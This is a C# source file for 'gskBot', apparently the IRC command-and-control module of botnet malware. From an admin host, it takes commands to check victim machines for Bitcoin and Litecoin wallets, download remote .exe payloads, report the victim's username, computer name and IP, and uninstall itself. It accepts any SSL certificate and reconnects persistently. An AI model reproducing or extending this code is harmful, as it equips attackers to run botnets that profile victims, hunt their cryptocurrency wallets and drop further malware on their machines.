#region Imports
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
#endregion

namespace gskBot {
    class IRC {
        #region Globals
        static SslStream SslStream;
        static StreamReader SockRead;
        static StreamWriter SockWrite;
        static TcpClient    TCP;
        public static bool  Connected = false;
        static string       Data;
        static string[]     Args;
        #endregion

        #region Close Connections
        public static void CloseConnections() {
            SockRead.Close();
            SockWrite.Close();
            SslStream.Close();
            TCP.Close();
            Connected = false;
        }
        #endregion
        
        #region Connect
        public static void Connect() {
            try {
                TCP       = new TcpClient(Config.Server, Config.Port) { ReceiveBufferSize = 1024 };
                SslStream = new SslStream(TCP.GetStream(), false, new RemoteCertificateValidationCallback(OnCertificateValidation));
                SslStream.AuthenticateAsClient(Config.Server);
                SockRead  = new StreamReader(SslStream);
                SockWrite = new StreamWriter(SslStream) { AutoFlush = true, NewLine = "\r\n" };
                Raw("NICK " + Config.Nick);
                Raw("USER " + Config.ID.ToLower() + " * " + Config.Server + " :" + Config.Nick);
                Connected = true;
                Listen();
            } catch {
                Reconnect();
            }
        }
        #endregion

        #region Command Handler
        public static void CommandHandler(string Data) {
            if (Data != null) {
                if (Config.Debug) Console.WriteLine(Data);
                Args = Data.Split();
                if (Args.Length >= 2) {
                    if (Args[0] == "PING") Raw("PONG " + Args[1]);
                    else if (Args[1] == "002") Raw("JOIN " + Config.Channel + " " + Config.ChannelKey); //Why is 001 not showing?
                    else if (Args[1] == "KICK") Raw("JOIN " + Config.Channel + " " + Config.ChannelKey);
                    else if (Args[1] == "PRIVMSG") {
                        string Message = Regex.Split(Data, Config.Channel + " :")[1];
                        string Nick = Data.Split(' ')[0].Split('!')[0].Replace(":", "");
                        string Host = Data.Split(' ')[0].Split('@')[1];
                        if (Host == Config.AdminHost & Message.StartsWith("@")) {
                            if (Message == "@coin") {
                                if (Function.CheckBTC()) SendMessage("Bitcoin wallet found.");
                                if (Function.CheckLTC()) SendMessage("Litecoin wallet found.");
                            } else if (Message.StartsWith("@dl all ") | Message.StartsWith("@dl " + Config.ID + " ")) {
                                string URL = Message.Replace("@dl " + Config.ID + " ", string.Empty);
                                URL = URL.Replace("@dl all ", string.Empty);
                                Uri FileURL = new Uri(URL);
                                if (URL.EndsWith(".exe")) {
                                    SendMessage("Downloading \"" + Path.GetFileName(FileURL.LocalPath) + "\" (" + Function.GetFileSize(URL) + ")");
                                    Stopwatch DownloadTimer = new Stopwatch();
                                    DownloadTimer.Start();
                                    Function.Download(URL);
                                    DownloadTimer.Stop();
                                    SendMessage("Download Complete! (" + Convert.ToInt32(DownloadTimer.Elapsed.TotalSeconds).ToString() + " Seconds)");
                                } else SendMessage("Error - Invalid URL");
                            } else if (Message == "@info" | Message == "@info " + Config.ID) {
                                SendMessage(Config.Version + " - " + Function.GetUsername() + "@" + Function.GetComputerName() + " (" + Function.GetIP() + ")" + Function.GetAge());
                            } else if (Message == "@kill " + Config.ID) {
                                Quit("KILL");
                                if (Config.Startup) Function.Uninstall();
                                else Environment.Exit(0);
                            }
                        }
                    } else if (Args[1] == ":Closing Link:") Connected = false;
                }
            } else Connected = false;
        }
        #endregion

        #region Listen
        public static void Listen() {
            while (Connected) {
                try {
                    Data = SockRead.ReadLine();
                    new Thread(() => CommandHandler(Data)).Start();
                } catch {
                    break;
                }
            }
            Reconnect();
        }
        #endregion

        #region Reconnect
        public static void Reconnect() {
            CloseConnections();
            Thread.Sleep(Config.ReconnectDelay);
            while (!Function.CheckNetwork()) {
                Thread.Sleep(10000);
            }
            Connect();
        }
        #endregion

        #region Raw Message
        public static void Raw(string Message) {
            SockWrite.WriteLine(Message);
        }
        #endregion

        #region Send Message
        public static void SendMessage(string Message) {
            Raw("PRIVMSG " + Config.Channel + " :" + Message);
        }
        #endregion

        #region SSL Certificate Validation
        private static bool OnCertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
        {
            return true;
        }
        #endregion

        #region Quit
        public static void Quit(string Message) {
            if (Connected) SockWrite.WriteLine("QUIT " + Message);
            CloseConnections();
        }
        #endregion
    }
}
